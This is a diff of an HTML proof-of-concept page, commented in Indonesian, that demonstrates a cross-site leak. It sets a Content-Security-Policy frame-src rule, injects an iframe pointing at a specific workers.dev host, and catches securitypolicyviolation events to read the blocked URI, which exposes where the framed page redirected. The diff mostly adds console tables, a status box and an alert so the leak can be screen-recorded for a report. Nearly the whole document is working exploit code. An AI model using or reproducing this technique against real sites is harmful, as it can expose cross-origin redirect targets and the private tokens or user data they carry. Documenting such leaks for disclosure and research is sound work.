@@ -2,39 +2,65 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline'; frame-src https://summer-waterfall-d973.utaa1009.workers.dev;">
+    <meta http-equiv="Content-Security-Policy" 
+          content="default-src 'self' 'unsafe-inline'; frame-src https://summer-waterfall-d973.utaa1009.workers.dev;">
     <title>Iframe Redirect Leak PoC</title>
+    
     <script src="https://cdn.jsdelivr.net/npm/eruda"></script>
-<script>eruda.init();</script>
+    <script>eruda.init();</script>
 </head>
 <body>
 
     <h3>Iframe CSP Redirect Leak (XS-Leak)</h3>
     
-    <button id="exploitBtn">Run Exploit</button>
-    <p id="status" style="word-break: break-all;">Status: Waiting...</p>
+    <button id="exploitBtn" style="padding: 10px 20px;">Run Exploit</button>
+    <p id="status" style="word-break: break-all; margin-top: 20px;">Status: Waiting...</p>
     <div id="frameContainer"></div>
 
     <script>
         const statusDiv = document.getElementById('status');
 
         document.addEventListener('securitypolicyviolation', (e) => {
-            // NGE-PRINT KE LAYAR HP SECARA LANGSUNG
-            statusDiv.innerHTML = `<br><b style="color:red; font-size:18px;">LEAKED URI:<br>${e.blockedURI}</b>`;
+            // 1. Console Log Detail (Buka tab Console di Eruda)
+            console.log("%c[!] CSP VIOLATION DETECTED", "color: red; font-weight: bold; font-size: 14px;");
             
-            // POP-UP ALERT BIAR MAKIN DRAMATIS DI VIDEO
-            alert('VULNERABILITY CONFIRMED!\n\nLeaked Origin:\n' + e.blockedURI);
+            // Nge-print semua info penting dalam bentuk tabel di console
+            console.table({
+                "Property": ["Blocked URI", "Violated Directive", "Original Policy", "Disposition"],
+                "Value": [e.blockedURI, e.violatedDirective, e.originalPolicy, e.disposition]
+            });
+
+            // Log object asli biar bisa di-inspect manual
+            console.log("Full Event Object:", e);
+
+            // 2. Update UI buat dokumentasi PoC
+            statusDiv.innerHTML = `
+                <div style="background: #ffebee; border: 1px solid red; padding: 10px; margin-top: 10px;">
+                    <b style="color:red;">VULNERABILITY CONFIRMED (XS-Leak)</b><br>
+                    <strong>Blocked URI:</strong> <code style="color: blue;">${e.blockedURI}</code><br>
+                    <strong>Directive:</strong> <code>${e.violatedDirective}</code>
+                </div>
+            `;
+            
+            // 3. Alert buat Trigger di Screen Record
+            alert('LEAK DETECTED!\n\nTarget redirected to:\n' + e.blockedURI);
         });
 
         document.getElementById('exploitBtn').addEventListener('click', () => {
-            statusDiv.innerHTML = "Injecting iframe...";
+            statusDiv.innerHTML = "Injecting iframe and waiting for redirect...";
+            console.log("[+] Creating iframe targeting workers.dev...");
             
             const iframe = document.createElement('iframe');
+            // Pastikan URL ini emang ngelakuin redirect ke luar origin workers.dev
             iframe.src = "https://summer-waterfall-d973.utaa1009.workers.dev/";
             iframe.style.width = "100%";
-            iframe.style.height = "100px";
-            iframe.style.border = "1px solid black";
-            document.getElementById('frameContainer').appendChild(iframe);
+            iframe.style.height = "150px";
+            iframe.style.marginTop = "20px";
+            
+            // Bersihin container dulu kalau mau running berkali-kali
+            const container = document.getElementById('frameContainer');
+            container.innerHTML = ''; 
+            container.appendChild(iframe);
         });
     </script>
 
